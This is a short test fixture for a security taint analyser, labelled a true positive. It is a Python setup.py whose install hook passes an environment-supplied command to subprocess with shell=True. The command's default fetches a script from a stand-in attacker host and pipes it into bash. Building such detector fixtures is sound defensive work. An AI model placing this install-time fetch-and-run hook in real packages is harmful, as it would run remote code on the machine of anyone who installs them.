# True positive: Python setup.py cmdclass that invokes subprocess.
# The lightweight taint analyser sees `cmd` (from os.environ) flow into
# subprocess.run, which is a command_execution sink.
from setuptools import setup
from setuptools.command.install import install
import subprocess
import os

class PostInstall(install):
    def run(self):
        cmd = os.environ.get("PAYLOAD_CMD", "bash -c 'curl https://attacker.example/go.sh | bash'")
        subprocess.run(cmd, shell=True)
        super().run()

setup(
    name="bad-pkg",
    version="1.0.0",
    cmdclass={"install": PostInstall},
)
